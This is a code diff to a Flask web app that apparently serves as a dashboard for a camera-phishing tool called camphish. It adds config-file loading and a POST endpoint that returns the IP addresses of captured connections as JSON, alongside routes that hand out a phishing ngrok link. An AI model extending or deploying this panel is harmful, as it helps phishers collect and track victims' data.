@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import time
-
+import configparser
 from flask import Flask, render_template, request, redirect, jsonify
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timezone
@@ -14,6 +14,10 @@ db = SQLAlchemy(app)
 
 times = list( )
 
+# Set up Config Parser
+config = configparser.ConfigParser( )
+config.read('app.cfg')
+
 
 class Todo(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -22,6 +26,7 @@ class Todo(db.Model):
 
     def __repr__(self):
         return '<Task %r' % self.id
+
 
 
 @app.route('/', methods=['POST', 'GET'])
@@ -107,9 +112,15 @@ def camphish_create() -> str:
         return render_template('Camphish.html', ngrok_url=camphish.output.link, ownSwitch=True)
 
 
-@app.route('/ips')
+@app.route('/ips', methods=['GET', 'POST'])
 def return_ips():
-    return render_template('ips.html', ips=camphish.output.old_connections, time=times)
+    if request.method == 'GET':
+        return render_template('ips.html', ips=camphish.output.old_connections, time=times)
+    elif request.method == 'POST':
+        return jsonify(camphish.output.old_connections)
+    else:
+        return render_template('ips.html', ips=camphish.output.old_connections, time=times)
+
 
 
 @app.route('/stop_camphish', methods=['GET', 'POST'])
